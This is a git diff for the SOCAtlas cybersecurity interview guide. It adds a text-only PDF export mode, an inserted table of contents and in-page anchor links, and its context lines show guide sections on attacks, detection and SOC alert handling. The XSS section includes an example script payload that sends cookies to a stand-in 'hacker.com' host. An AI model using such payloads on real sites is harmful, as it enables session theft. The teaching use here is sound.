@@ -245,6 +245,9 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
   const SECTION_SELECTOR = '[data-pdf-section-group]';
   const HTML2PDF_CDN = "https://cdn.jsdelivr.net/npm/html2pdf.js@0.10.1/dist/html2pdf.bundle.min.js";
   const EMOJI_RE = /[\p{Extended_Pictographic}️]/gu;
+  const PDF_PAGE_WIDTH_MM = 210;
+  const PDF_PAGE_HEIGHT_MM = 297;
+  const PDF_MARGIN_MM = 10;
 
   const parseSelection = () => {
     const raw = new URLSearchParams(window.location.search).get("sections");
@@ -264,6 +267,9 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
     const mode = new URLSearchParams(window.location.search).get("mode");
     return mode === "paper" ? "paper" : "color";
   };
+
+  const parseImages = () =>
+    new URLSearchParams(window.location.search).get("images") !== "0";
 
   const isDownloadRequested = () =>
     new URLSearchParams(window.location.search).get("download") === "1";
@@ -306,11 +312,35 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
     }
 
     const modeLabel = parseMode() === "paper" ? "Paper-friendly" : "Color PDF";
-    note.textContent = `Included in this PDF: ${labels.join(", ")} • ${modeLabel}`;
+    const imagesLabel = parseImages() ? "With images" : "Text only";
+    note.textContent = `Included in this PDF: ${labels.join(", ")} • ${modeLabel} • ${imagesLabel}`;
   };
 
   const applyMode = () => {
     document.documentElement.dataset.pdfMode = parseMode();
+  };
+
+  const applyImagePreference = () => {
+    const includeImages = parseImages();
+    document.documentElement.dataset.pdfImages = includeImages ? "on" : "off";
+
+    if (includeImages) {
+      return;
+    }
+
+    const seenFigures = new Set();
+    document
+      .querySelectorAll(".md-content__inner figure, .md-content__inner picture, .md-content__inner img, .md-content__inner svg")
+      .forEach((node) => {
+        const figure = node.closest("figure");
+        if (figure && !seenFigures.has(figure)) {
+          seenFigures.add(figure);
+          figure.hidden = true;
+          return;
+        }
+
+        node.hidden = true;
+      });
   };
 
   const ensureStatusNote = () => {
@@ -342,16 +372,17 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
   const buildFilename = () => {
     const selected = parseSelection();
     const mode = parseMode();
+    const imagesSuffix = parseImages() ? "" : "-no-images";
 
     if (!selected.length) {
-      return `socatlas-complete-guide-${mode}.pdf`;
+      return `socatlas-complete-guide-${mode}${imagesSuffix}.pdf`;
     }
 
     if (selected.length <= 2) {
-      return `socatlas-${selected.join("-")}-${mode}.pdf`;
+      return `socatlas-${selected.join("-")}-${mode}${imagesSuffix}.pdf`;
     }
 
-    return `socatlas-${selected[0]}-${selected.length}-sections-${mode}.pdf`;
+    return `socatlas-${selected[0]}-${selected.length}-sections-${mode}${imagesSuffix}.pdf`;
   };
 
   const stripEmoji = (value) =>
@@ -391,6 +422,10 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
   };
 
   const waitForImages = async () => {
+    if (!parseImages()) {
+      return;
+    }
+
     const images = Array.from(document.querySelectorAll(".md-content__inner img"));
     await Promise.all(
       images.map(
@@ -409,6 +444,10 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
   };
 
   const waitForImagesWithin = async (root) => {
+    if (!parseImages()) {
+      return;
+    }
+
     const images = Array.from(root.querySelectorAll("img"));
     await Promise.all(
       images.map(
@@ -433,6 +472,27 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
       });
     });
 
+  const removeImages = (root) => {
+    const removedFigures = new Set();
+    root.querySelectorAll("figure, picture, img, svg").forEach((node) => {
+      if (node.tagName === "FIGURE") {
+        node.remove();
+        return;
+      }
+
+      const figure = node.closest("figure");
+      if (figure && root.contains(figure)) {
+        if (!removedFigures.has(figure)) {
+          removedFigures.add(figure);
+          figure.remove();
+        }
+        return;
+      }
+
+      node.remove();
+    });
+  };
+
   const buildExportClone = (target) => {
     const shell = document.createElement("div");
     shell.className = "pdf-export-shell";
@@ -441,6 +501,10 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
     clone.classList.add("pdf-export-canvas");
 
     clone.querySelectorAll("#pdf-download-status").forEach((node) => node.remove());
+
+    if (!parseImages()) {
+      removeImages(clone);
+    }
 
     if (parseMode() === "paper") {
       clone.querySelectorAll("[data-pdf-section-title]").forEach((section) => {
@@ -460,6 +524,79 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
     document.body.appendChild(shell);
 
     return { shell, clone };
+  };
+
+  const collectPdfNavigation = (container) => {
+    const contentRoot =
+      container.querySelector(".pdf-export-canvas") ||
+      container.firstElementChild ||
+      container;
+    const contentWidth =
+      contentRoot.scrollWidth ||
+      contentRoot.getBoundingClientRect().width ||
+      1;
+    const printableWidthMm = PDF_PAGE_WIDTH_MM - PDF_MARGIN_MM * 2;
+    const printableHeightMm = PDF_PAGE_HEIGHT_MM - PDF_MARGIN_MM * 2;
+    const pageHeightPx = contentWidth * (printableHeightMm / printableWidthMm);
+
+    return Array.from(contentRoot.querySelectorAll(SECTION_SELECTOR))
+      .filter((section) => !section.hidden)
+      .map((section) => ({
+        title: stripEmoji(section.dataset.pdfSectionTitle || "Section"),
+        pageNumber: Math.max(1, Math.floor(section.offsetTop / pageHeightPx) + 1),
+      }));
+  };
+
+  const injectPdfContents = (pdf, sections) => {
+    if (!sections.length || typeof pdf.insertPage !== "function") {
+      return;
+    }
+
+    const entriesPerPage = 14;
+    const insertedPages = Math.max(1, Math.ceil(sections.length / entriesPerPage));
+
+    for (let page = 0; page < insertedPages; page += 1) {
+      pdf.insertPage(page + 1);
+    }
+
+    const modeLabel = parseMode() === "paper" ? "Paper-friendly" : "Color PDF";
+    const imagesLabel = parseImages() ? "With images" : "Text only";
+
+    for (let page = 0; page < insertedPages; page += 1) {
+      const pageNumber = page + 1;
+      pdf.setPage(pageNumber);
+      pdf.setTextColor(15, 23, 42);
+      pdf.setFont("helvetica", "bold");
+      pdf.setFontSize(22);
+      pdf.text(page === 0 ? "SOCAtlas PDF Contents" : "SOCAtlas PDF Contents (cont.)", 18, 22);
+
+      pdf.setFont("helvetica", "normal");
+      pdf.setFontSize(10.5);
+      pdf.setTextColor(71, 85, 105);
+      pdf.text(`Jump directly inside this PDF. ${modeLabel}. ${imagesLabel}.`, 18, 30);
+
+      const slice = sections.slice(page * entriesPerPage, (page + 1) * entriesPerPage);
+      let y = 44;
+
+      slice.forEach((section) => {
+        const targetPage = section.pageNumber + insertedPages;
+        pdf.setTextColor(17, 24, 39);
+        pdf.setFont("helvetica", "bold");
+        pdf.setFontSize(12);
+        pdf.text(section.title, 18, y);
+
+        pdf.setFont("helvetica", "normal");
+        pdf.text(String(targetPage), 188, y, { align: "right" });
+        pdf.setDrawColor(220, 226, 232);
+        pdf.line(18, y + 2.4, 190, y + 2.4);
+
+        if (typeof pdf.link === "function") {
+          pdf.link(18, y - 5.5, 172, 8, { pageNumber: targetPage });
+        }
+
+        y += 14;
+      });
+    }
   };
 
   const triggerDownload = async () => {
@@ -482,10 +619,11 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
       await waitForImagesWithin(exportNodes.clone);
       await waitForLayout();
 
-      await html2pdf()
+      const worker = html2pdf()
         .set({
           filename: buildFilename(),
-          margin: [10, 10, 10, 10],
+          margin: [PDF_MARGIN_MM, PDF_MARGIN_MM, PDF_MARGIN_MM, PDF_MARGIN_MM],
+          enableLinks: false,
           pagebreak: {
             mode: ["css", "legacy"],
             avoid: [
@@ -514,8 +652,16 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
             orientation: "portrait",
           },
         })
-        .from(exportNodes.clone)
-        .save();
+        .from(exportNodes.clone);
+
+      await worker.toContainer();
+      const container = await worker.get("container");
+      const pdfNavigation = collectPdfNavigation(container);
+      await worker.toCanvas();
+      await worker.toPdf();
+      const pdf = await worker.get("pdf");
+      injectPdfContents(pdf, pdfNavigation);
+      await worker.save();
 
       if (exportShell) {
         exportShell.remove();
@@ -536,6 +682,7 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
   const init = () => {
     applyMode();
     applySelection(parseSelection());
+    applyImagePreference();
 
     if (isDownloadRequested()) {
       window.setTimeout(() => {
@@ -556,7 +703,11 @@ html[data-pdf-export="download"] .pdf-export-canvas .md-typeset blockquote {
 
 <section class="pdf-guide-section" data-pdf-section-group="start-here" data-pdf-section-title="Start Here" markdown="1">
 
+<div id="guide-section-start-here"></div>
+
 ## Start Here
+
+<div id="guide-page-index"></div>
 
 ### Home
 
@@ -579,25 +730,25 @@ SOCAtlas helps you master cybersecurity concepts in a clear order and revise the
 
     Begin with the fundamentals: what cybersecurity means, the CIA Triad, encryption, and hashing. These are the concepts that come up in every interview.
 
-    [Open fundamentals](fundamentals/introduction.md)
+    [Open fundamentals](#guide-page-fundamentals-introduction)
 
 -   __Networking feels fuzzy?__
 
     Review IP addressing, DNS, DHCP, VPNs, firewalls, proxies, and both the OSI and TCP/IP models. They are the backbone of most security discussions.
 
-    [Study networking](networking/basics.md)
+    [Study networking](#guide-page-networking-basics)
 
 -   __Preparing for SOC roles?__
 
     Focus on SIEM, EDR, IDS, IPS, incident response, IOCs, IOAs, and the MITRE ATT&CK framework — exactly what SOC analysts use daily.
 
-    [Go to detection and defense](defense/siem_soc_edr.md)
+    [Go to detection and defense](#guide-section-detection-defense)
 
 -   __Need fast revision?__
 
     Jump straight into the 1200 quick-point pages. Each row gives you a clean definition, a one-sentence answer, and a real-world example.
 
-    [Jump to quick points](quick/basics.md)
+    [Jump to quick points](#guide-page-quick-basics)
 
 </div>
 
@@ -618,18 +769,18 @@ Follow this four-step structure and you will sound confident and clear in any te
 
 | Step | What to Read | Why |
 |------|-------------|-----|
-| 1 | [What is Cybersecurity?](fundamentals/introduction.md) | Build the mental model first |
-| 2 | [CIA Triad](fundamentals/cia_triad.md), [Encryption](fundamentals/encryption.md), [Hashing](fundamentals/hashing.md) | The three pillars interviewers always test |
-| 3 | [Networking Basics](networking/basics.md) and [OSI & TCP/IP Models](networking/osi_tcpip.md) | Everything connects through the network |
-| 4 | [Vulnerabilities & Risk](threats/vulnerabilities.md) and [Modern Malware](threats/cyber_threats.md) | Know what you are defending against |
-| 5 | [SIEM, SOC & EDR](defense/siem_soc_edr.md) and [Incident Response](defense/incident_response.md) | The tools and playbooks defenders use |
+| 1 | [What is Cybersecurity?](#guide-page-fundamentals-introduction) | Build the mental model first |
+| 2 | [CIA Triad](#guide-page-fundamentals-cia-triad), [Encryption](#guide-page-fundamentals-encryption), [Hashing](#guide-page-fundamentals-hashing) | The three pillars interviewers always test |
+| 3 | [Networking Basics](#guide-page-networking-basics) and [OSI & TCP/IP Models](#guide-page-networking-osi-tcpip) | Everything connects through the network |
+| 4 | [Vulnerabilities & Risk](#guide-page-threats-vulnerabilities) and [Modern Malware](#guide-page-threats-cyber-threats) | Know what you are defending against |
+| 5 | [SIEM, SOC & EDR](#guide-section-detection-defense) and [Incident Response](#guide-page-defense-incident-response) | The tools and playbooks defenders use |
 
 ##### Fast revision before an interview
 
-1. Skim [Basics](quick/basics.md)
-2. Review [Attacks](quick/attacks.md) and [Tools](quick/tools.md)
-3. Revisit [Security frameworks](frameworks.md)
-4. Finish with [IOC, IOA & MITRE ATT&CK](governance/ioc_ioa_mitre.md)
+1. Skim [Basics](#guide-page-quick-basics)
+2. Review [Attacks](#guide-page-quick-attacks) and [Tools](#guide-page-quick-tools)
+3. Revisit [Security frameworks](#guide-page-frameworks)
+4. Finish with [IOC, IOA & MITRE ATT&CK](#guide-page-governance-ioc-ioa-mitre)
 
 #### Must-know concepts at a glance
 
@@ -654,7 +805,11 @@ Follow this four-step structure and you will sound confident and clear in any te
 
 <section class="pdf-guide-section" data-pdf-section-group="fundamentals" data-pdf-section-title="🏛️ Fundamentals" markdown="1">
 
+<div id="guide-section-fundamentals"></div>
+
 ## 🏛️ Fundamentals
+
+<div id="guide-page-fundamentals-introduction"></div>
 
 ### Introduction to Cybersecurity
 
@@ -693,6 +848,8 @@ If an interviewer asks, "What is cybersecurity?", a strong answer usually has fo
 
 !!! tip "Easy way to remember it"
     Cybersecurity is the digital equivalent of locks, alarms, identity checks, cameras, and emergency response plans.
+
+<div id="guide-page-fundamentals-cia-triad"></div>
 
 ### CIA Triad & Founding Principles
 
@@ -759,6 +916,8 @@ When asked about the CIA Triad, do not only expand the acronym. Explain each par
 !!! note "Related concept"
     AAA helps enforce the CIA Triad in real systems: authentication verifies identity, authorization controls access, and accounting records activity.
 
+<div id="guide-page-fundamentals-encryption"></div>
+
 ### Encryption & Key Management
 
 Encryption protects data by converting readable information into ciphertext so that only someone with the correct key can read it. It is one of the main controls used to protect confidentiality.
@@ -810,6 +969,8 @@ This hybrid approach gives both security and performance.
 
 ###### What is a Key Management Service, or KMS?
 > **Answer:** A KMS is a centralized system for generating, storing, rotating, and controlling encryption keys so applications do not need to embed or expose those keys directly.
+
+<div id="guide-page-fundamentals-hashing"></div>
 
 ### Hashing & Data Integrity
 
@@ -869,7 +1030,11 @@ Hashing converts data into a fixed-length value called a hash or digest. Unlike 
 
 <section class="pdf-guide-section" data-pdf-section-group="networking" data-pdf-section-title="🌐 Networking" markdown="1">
 
+<div id="guide-section-networking"></div>
+
 ## 🌐 Networking
+
+<div id="guide-page-networking-basics"></div>
 
 ### Networking Basics
 
@@ -941,6 +1106,8 @@ Security teams use these basics every day to:
 - segment networks to limit blast radius
 
 If you can read IPs, ports, protocols, and traffic patterns comfortably, you can understand both attacks and defenses much faster.
+
+<div id="guide-page-networking-osi-tcpip"></div>
 
 ### OSI & TCP/IP Models
 
@@ -1020,6 +1187,8 @@ This matters in security because attacks such as SYN floods abuse this connectio
 ###### What is the order of volatility in forensics?
 > **Answer:** It is the order in which evidence should be collected based on how quickly it disappears, usually starting with volatile data such as memory and active network state before moving to disks and long-term logs.
 
+<div id="guide-page-networking-aaa-dns-dhcp"></div>
+
 ### Identity — AAA, DNS, DHCP
 
 AAA, DNS, and DHCP are core networking concepts that come up constantly in cybersecurity interviews. AAA controls identity and access, DNS resolves names to IP addresses, and DHCP assigns IP configuration automatically.
@@ -1090,6 +1259,8 @@ DHCP, or Dynamic Host Configuration Protocol, automatically gives devices networ
 
 ###### What is the difference between an authoritative and a recursive DNS server?
 > A recursive server looks up the answer on behalf of the client. An authoritative server holds the final records for a domain.
+
+<div id="guide-page-networking-vpn-firewall"></div>
 
 ### Security — VPN, Firewall, Proxy
 
@@ -1183,7 +1354,11 @@ In a real environment, these controls often appear together:
 
 <section class="pdf-guide-section" data-pdf-section-group="major-attacks-directory" data-pdf-section-title="🏴‍☠️ Major Attacks Directory" markdown="1">
 
+<div id="guide-section-major-attacks-directory"></div>
+
 ## 🏴‍☠️ Major Attacks Directory
+
+<div id="guide-page-threats-vulnerabilities"></div>
 
 ### Vulnerabilities & Risk
 
@@ -1251,6 +1426,8 @@ Most organizations handle vulnerabilities through a repeatable process:
 ###### What is the difference between a vulnerability assessment and a penetration test?
 > **Answer:** A vulnerability assessment focuses on identifying and listing weaknesses, often at scale. A penetration test goes further by attempting controlled exploitation to show whether those weaknesses can actually be used to gain access or cause impact.
 
+<div id="guide-page-threats-cyber-threats"></div>
+
 ### Cyber Threats Landscape
 
 Malware is any software designed to harm, disrupt, spy on, extort, or gain unauthorized access to a system. Interviewers often expect you to distinguish the major malware types and explain how they spread or what they are meant to do.
@@ -1313,6 +1490,8 @@ Ransomware is one of the most disruptive malware types because it affects both a
 ###### What is fileless malware?
 > Fileless malware operates mainly in memory and often abuses legitimate tools such as PowerShell or WMI, which makes it harder for traditional file-based antivirus to detect.
 
+<div id="guide-page-threats-social-engineering"></div>
+
 ### Social Engineering
 
 Social engineering attacks target people instead of software flaws. The attacker’s goal is to manipulate trust, urgency, fear, or routine behavior so a victim reveals information, clicks a link, opens a file, or grants access.
@@ -1372,6 +1551,8 @@ Attackers often rely on a few recurring tactics:
 ###### What is pretexting?
 > **Answer:** Pretexting is when an attacker invents a believable story or role to persuade a victim to share information or perform an action they would normally refuse.
 
+<div id="guide-page-attack-xss"></div>
+
 ### Cross-Site Scripting (XSS)
 
 !!! note "What is XSS?"
@@ -1397,6 +1578,8 @@ An attacker posts a comment on a blog: `<script>fetch('http://hacker.com/steal?c
     *   **Impact:** Stealing session cookies, keystroke logging, and hijacking user sessions.
     *   **Fix:** Strict output encoding, input validation, and implementing strong Content Security Policies (CSP).
 
+<div id="guide-page-attack-sqli"></div>
+
 ### SQL Injection (SQLi)
 
 !!! note "What is SQL Injection?"
@@ -1421,6 +1604,8 @@ An attacker visits an e-commerce URL like `shop.com/item?id=5` and changes it to
     *   **Impact:** Bypassing login screens, dumping entire customer databases, and deleting data.
     *   **Fix:** Always use Parameterized Queries (Prepared Statements) so input is absolutely never treated as code.
 
+<div id="guide-page-attack-csrf"></div>
+
 ### Cross-Site Request Forgery (CSRF)
 
 !!! note "What is CSRF?"
@@ -1443,6 +1628,8 @@ You are logged into `bank.com`. An attacker sends you an email with a hidden ima
     *   **Concept:** Tricking a logged-in user's browser into secretly executing an unwanted action on a trusted site.
     *   **Impact:** Unauthorized fund transfers, password changes, and account takeovers.
     *   **Fix:** Implement unique, unpredictable Anti-CSRF tokens for every form and utilize the SameSite cookie attribute.
+
+<div id="guide-page-attack-ssrf"></div>
 
 ### Server-Side Request Forgery (SSRF)
 
@@ -1467,6 +1654,8 @@ An attacker exploits a PDF generator on a website. Instead of giving it a normal
     *   **Impact:** Stealing internal cloud API keys (AWS Metadata), bypassing firewalls, and pivot scanning.
     *   **Fix:** Use strict URL allow-lists, disable internal routing for the web app, and enforce AWS IMDSv2.
 
+<div id="guide-page-attack-mitm"></div>
+
 ### Man-in-the-Middle (MitM)
 
 !!! note "What is MitM?"
@@ -1489,6 +1678,8 @@ An attacker sets up a fake open Wi-Fi hotspot at a coffee shop named "Free Publi
     *   **Concept:** Secretly intercepting communication between a user and a server on a local network.
     *   **Impact:** Stealing plaintext passwords, session hijacking, and altering messages in transit.
     *   **Fix:** Enforce strong encryption via HTTPS, implement HSTS, and use secure VPN tunnels on public networks.
+
+<div id="guide-page-attack-arp-spoofing"></div>
 
 ### ARP Spoofing (Poisoning)
 
@@ -1513,6 +1704,8 @@ An employee logs onto their corporate building's internal network. An attacker i
     *   **Concept:** Sending fake ARP messages on a local network to trick computers into sending their traffic to the attacker.
     *   **Impact:** Enables Man-in-the-Middle (MitM) traffic interception, session hijacking, and local network DoS.
     *   **Fix:** Enable Dynamic ARP Inspection (DAI) on corporate switches and use Static ARP tables for highly critical servers.
+
+<div id="guide-page-attack-dos"></div>
 
 ### Denial of Service (DoS)
 
@@ -1543,7 +1736,11 @@ An attacker rents an "IoT Botnet" made up of 100,000 compromised smart cameras. 
 
 <section class="pdf-guide-section" data-pdf-section-group="detection-defense" data-pdf-section-title="🛡️ Detection & Defense" markdown="1">
 
+<div id="guide-section-detection-defense"></div>
+
 ## 🛡️ Detection & Defense
+
+<div id="guide-page-defense-ids-ips"></div>
 
 ### IDS & IPS
 
@@ -1588,6 +1785,8 @@ Looks for behavior that deviates from the normal baseline. Better for unknown th
 
 ###### What is a SPAN port?
 > A SPAN port, or port mirroring, is a switch port that receives a copy of network traffic so a monitoring tool such as a NIDS can inspect it without sitting inline.
+
+<div id="guide-page-defense-siem-soar"></div>
 
 ### SIEM & SOAR
 
@@ -1685,6 +1884,8 @@ SOAR playbook triggered
 ###### What is a SOAR playbook?
 > A playbook is an automated workflow that defines the exact steps to take in response to a specific type of alert — for example, a phishing playbook might extract links, detonate them in a sandbox, block the sender domain, and notify the user's manager.
 
+<div id="guide-page-defense-soc"></div>
+
 ### SOC — Security Operations
 
 The SOC is the team and operational structure responsible for monitoring an organisation's environment 24/7, investigating security events, and coordinating response. It is not a tool — it is a function made up of people, processes, and technology working together.
@@ -1768,6 +1969,8 @@ A SOC doesn't run on one tool. It uses a stack:
 
 ###### What is threat hunting?
 > Threat hunting is a proactive search for attacker behaviour that automated detections have not yet caught. A hunter starts with a hypothesis — "what if an attacker is using living-off-the-land techniques?" — and searches through EDR and SIEM data looking for subtle signs of that behaviour.
+
+<div id="guide-page-defense-edr-xdr"></div>
 
 ### EDR, XDR & MDR
 
@@ -1917,6 +2120,8 @@ MDR is a service, not a product. An organisation hires an MDR provider who monit
 ###### When would you choose MDR over building your own SOC?
 > When the organisation lacks the budget, staffing, or expertise to run 24/7 monitoring internally. MDR makes sense for organisations without a mature security function who need immediate detection and response capability without a multi-year programme to build it.
 
+<div id="guide-page-defense-kill-chain"></div>
+
 ### Cyber Kill Chain
 
 The cyber kill chain is a seven-stage attack lifecycle model created by Lockheed Martin. It maps how an attacker progresses from initial research all the way to achieving their goal — and shows defenders exactly where they can stop the attack.
@@ -1988,6 +2193,8 @@ Use the kill chain to explain attack flow in interviews. Use ATT&CK when doing d
 ###### Why is it better to stop an attack early in the kill chain?
 > Because each stage builds on the last. Breaking the chain at delivery prevents exploitation entirely. By stage 6 or 7 the attacker has persistence, C2, and is actively working toward their objective — stopping them at that point requires containment, eradication, and recovery, which is far more disruptive than blocking a phishing email.
 
+<div id="guide-page-defense-incident-response"></div>
+
 ### Incident Response
 
 Incident response is the structured process security teams follow to prepare for, detect, contain, eradicate, and recover from security incidents while minimizing business impact.
@@ -2057,7 +2264,11 @@ Incident response is the structured process security teams follow to prepare for
 
 <section class="pdf-guide-section" data-pdf-section-group="governance-compliance" data-pdf-section-title="⚖️ Governance & Compliance" markdown="1">
 
+<div id="guide-section-governance-compliance"></div>
+
 ## ⚖️ Governance & Compliance
+
+<div id="guide-page-governance-compliance"></div>
 
 ### Compliance & Regulatory Floor
 
@@ -2101,6 +2312,8 @@ Compliance means following laws, regulations, standards, or contractual requirem
 
 ###### What is a data retention policy?
 > A data retention policy defines how long different categories of data should be kept and when they should be securely deleted.
+
+<div id="guide-page-frameworks"></div>
 
 ### Security Frameworks (NIST & ISO)
 
@@ -2189,6 +2402,8 @@ If an interviewer asks which framework you would use, anchor your answer to the 
 ###### How do you decide which framework to prioritize?
 > **Answer:** Start with the business context. Industry, geography, customer requirements, and risk profile determine the priority. For example, card data pushes PCI DSS higher, healthcare data pushes HIPAA higher, and general program maturity often starts with NIST CSF.
 
+<div id="guide-page-governance-risk-threat-intel"></div>
+
 ### Risk & Threat Intelligence
 
 Risk management helps an organization decide what to protect first. Threat intelligence helps it understand which attackers, techniques, and indicators matter most right now. Together, they help security teams spend time and budget where it will reduce the most risk.
@@ -2255,6 +2470,8 @@ Threat intelligence becomes useful when it changes decisions. For example:
 ###### What is the Pyramid of Pain?
 > **Answer:** The Pyramid of Pain shows how difficult it is for an attacker to change different artifacts. Blocking a hash or IP address causes little pain because attackers can replace them quickly. Detecting tactics and techniques causes much more pain because changing behavior is harder.
 
+<div id="guide-page-governance-ioc-ioa-mitre"></div>
+
 ### TTPs — IOC, IOA & MITRE ATT&CK
 
 IOCs, IOAs, and MITRE ATT&CK help analysts describe suspicious activity in a structured way. They are common interview topics because they connect threat detection, incident response, and threat hunting.
@@ -2318,7 +2535,11 @@ MITRE ATT&CK documents attacker tactics and techniques based on real-world obser
 
 <section class="pdf-guide-section" data-pdf-section-group="soc-alerts-scenarios" data-pdf-section-title="🚨 SOC Alerts & Scenarios" markdown="1">
 
+<div id="guide-section-soc-alerts-scenarios"></div>
+
 ## 🚨 SOC Alerts & Scenarios
+
+<div id="guide-page-alerts-general"></div>
 
 ### General Alert Handling
 
@@ -2354,6 +2575,8 @@ Finally, I **document the incident properly** in the ticketing system, including
     *   **Triage:** First, I review the alert details and severity. Then, I perform initial triage by correlating logs and checking historical activity.
     *   **Investigate:** If the alert is suspicious, I investigate further using SIEM and endpoint tools.
     *   **Contain & Escalate:** If confirmed malicious, I take immediate containment actions, escalate to the L2 team, and extensively document the incident.
+
+<div id="guide-page-alerts-malware"></div>
 
 ### Malware Infection
 
@@ -2392,6 +2615,8 @@ Finally, I **document the incident** in the ticketing system with all the invest
     *   **Verify:** I verify the threat level using external threat intelligence (like VirusTotal).
     *   **Contain & Escalate:** If confirmed malicious, I isolate the affected endpoint, block the malicious indicators globally, escalate to L2, and document the incident.
 
+<div id="guide-page-alerts-ransomware"></div>
+
 ### Ransomware Attack
 
 !!! note "What is Ransomware?"
@@ -2424,6 +2649,8 @@ Finally, I work with the **disaster recovery team** to verify that offline, immu
     *   **Immediate Containment:** I aggressively isolate infected hosts via EDR to immediately stop the spread.
     *   **Investigate & Eradicate:** I investigate the entry vector and reset any compromised administrative credentials.
     *   **Recovery:** I work directly with the infrastructure team to wipe the machines completely and restore them strictly from offline, immutable backups.
+
+<div id="guide-page-alerts-phishing"></div>
 
 ### Phishing & Email
 
@@ -2460,6 +2687,8 @@ Finally, I run a search query across the mail server to **purge the phishing ema
     *   **Investigate:** I check proxy and EDR logs exclusively to see if the user actually clicked the link or executed the attachment.
     *   **Contain & Escalate:** I logically purge the email globally, block the sender domain, and force a password reset or host isolation if the user was compromised.
 
+<div id="guide-page-alerts-ddos"></div>
+
 ### DDoS Attack
 
 !!! note "What is a DDoS Attack?"
@@ -2494,6 +2723,8 @@ Finally, I **continuously monitor** application health metrics to verify the mit
     *   **Triage:** I determine if the alert is a volumetric (Layer 3/4) or an application-layer (Layer 7) DDoS attack.
     *   **Volumetric Response:** For volumetric attacks, I rely on upstream cloud scrubbing or ISP blackholing.
     *   **Layer 7 Response:** For Layer 7 attacks, I deploy strict WAF rate-limiting, block malicious User-Agents, implement geoblocking, and continuously monitor application health.
+
+<div id="guide-page-alerts-brute-force"></div>
 
 ### Brute Force & Spray
 
@@ -2531,6 +2762,8 @@ Finally, I **document the incident properly** in the ticketing system with all t
     *   **Investigate:** I check the source IP, targeted accounts, and verify the IP reputation.
     *   **Contain & Escalate:** If confirmed as a brute-force or spray attack, I block the attacking IP, secure the affected account, escalate to L2, and document the incident.
 
+<div id="guide-page-alerts-crowdstrike"></div>
+
 ### CrowdStrike (EDR) Alert
 
 !!! note "What is a CrowdStrike Alert?"
@@ -2565,6 +2798,8 @@ Finally, I **escalate the findings** cleanly to the incident response team and d
     *   **Investigate:** I extensively analyze the process tree and command-line arguments to understand the root cause.
     *   **Contain & Escalate:** If malicious, I instantly initiate Network Containment via CrowdStrike, kill the process, and escalate all IOCs to the IR team while documenting the ticket.
 
+<div id="guide-page-alerts-impossible-travel"></div>
+
 ### Impossible Travel
 
 !!! note "What is Impossible Travel?"
@@ -2598,6 +2833,8 @@ Finally, I **escalate the incident** to L2 to check the user's email forwarding 
     *   **Triage:** I review the identity logs to check the source IPs, geographic locations, exact time difference, and MFA status.
     *   **Investigate:** I rule out legitimate VPN usage or proxy routing by the employee.
     *   **Contain & Escalate:** If confirmed as a compromised account, I disable the user, revoke active sessions, force an immediate password reset, and investigate for any exfiltrated data.
+
+<div id="guide-page-alerts-powershell"></div>
 
 ### Suspicious PowerShell
 
@@ -2634,6 +2871,8 @@ After containment, I **escalate the decoded payload**, the C2 IP addresses, and 
     *   **Investigate:** I extract and decode any Base64 encoded commands and analyze the raw payload for malicious intent.
     *   **Contain & Escalate:** If confirmed malicious, I isolate the host via EDR, escalate the decoded IOCs to L2, and document the incident.
 
+<div id="guide-page-alerts-data-exfil"></div>
+
 ### Data Exfiltration
 
 !!! note "What is Data Exfiltration?"
@@ -2667,6 +2906,8 @@ Finally, I **document the exact volume of data**, the destination, the user invo
     *   **Triage:** I review proxy and firewall logs to determine the specific user, the volume of data transferred, and the external destination.
     *   **Investigate:** I check endpoint logs to see if specific files were zipped or bulk accessed before the transfer.
     *   **Contain & Escalate:** If unauthorized, I block the destination IP on the firewall, isolate the host, and critically escalate to Legal and IR due to severe data breach implications.
+
+<div id="guide-page-alerts-sqli"></div>
 
 ### SQL Injection (WAF)
 
@@ -2702,6 +2943,8 @@ Finally, I **escalate the vulnerability** to the AppSec team with the raw HTTP l
     *   **Triage:** I review the WAF logs to see the specific malicious payload and verify if the WAF actually 'Blocked' or just 'Monitored' the request.
     *   **Investigate:** I analyze the backend HTTP response code and database logs to verify if a database dump actually succeeded.
     *   **Contain & Escalate:** If the app is vulnerable, I block the attacking IP, switch the WAF to blocking mode, and escalate to AppSec to fix the code using parameterized queries.
+
+<div id="guide-page-alerts-priv-esc"></div>
 
 ### Privilege Escalation
 
@@ -2739,7 +2982,11 @@ Finally, I **escalate the incident** to the L2 and IR teams with the exact timel
 
 <section class="pdf-guide-section" data-pdf-section-group="1200-quick-points" data-pdf-section-title="⚡ 1200 Quick Points" markdown="1">
 
+<div id="guide-section-1200-quick-points"></div>
+
 ## ⚡ 1200 Quick Points
+
+<div id="guide-page-quick-basics"></div>
 
 ### Core Basics (1–100)
 
@@ -2883,6 +3130,8 @@ This section is designed for fast revision. Each point gives you a short concept
 
 *(Points 101-1200 continue in the quick-point categories. Use the navigation to move through each domain.)*
 
+<div id="guide-page-quick-fundamentals"></div>
+
 ### Identity & Auth (101–200)
 
 !!! note "Format: Point & Concept → Interview Answer → Example / Tool"
@@ -3008,6 +3257,8 @@ This section is designed for fast revision. Each point gives you a short concept
 | 198. False Positive | An alert that fires on benign activity, wasting analyst time and causing alert fatigue. | SIEM flags a legitimate admin running a script as suspicious |
 | 199. True Positive | An alert that correctly identifies real malicious activity. | SIEM detects real credential-stuffing attack and SOC confirms it |
 | 200. Alert Fatigue | Condition where analysts receive so many alerts that important ones are missed or ignored. | SOC drowning in 50,000 alerts/day tunes rules to focus on high fidelity |
+
+<div id="guide-page-quick-attacks"></div>
 
 ### Attacker Tactics (201–300)
 
@@ -3135,6 +3386,8 @@ This section is designed for fast revision. Each point gives you a short concept
 | 299. Race Condition | Two processes access shared resource simultaneously causing flaw | TOCTTOU (Time of Check to Time of Use) |
